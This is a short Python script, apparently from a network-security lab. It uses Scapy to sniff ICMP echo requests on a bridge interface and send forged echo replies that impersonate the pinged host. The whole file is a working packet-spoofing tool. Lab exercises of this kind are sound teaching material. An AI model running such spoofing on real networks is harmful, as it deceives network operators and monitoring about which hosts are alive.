from scapy.all import *


def sniff_and_spoof_packet(packet):
    # Intercept the ICMP echo request (ping) packet
    if ICMP in packet and packet[ICMP].type == 8:
        print("New ping packet intercepted from %s to %s" % (packet[IP].src, packet[IP].dst))
        # Copying the packet and setting the responder to the ping request
        forged_packet = copy.deepcopy(packet[IP])
        forged_packet.src = packet[IP].dst
        forged_packet.dst = packet[IP].src
        # Setting ICMP type as 0 (Echo Reply). https://en.wikipedia.org/wiki/Internet_Control_Message_Protocol
        forged_packet[ICMP].type = 0

        print("Sending spoofed pong packet as %s\n" % (forged_packet.src))
        send(forged_packet, verbose=0)


if __name__ == '__main__':
    sniff(iface="br-1a115f7b3a07", filter="icmp", prn=sniff_and_spoof_packet)
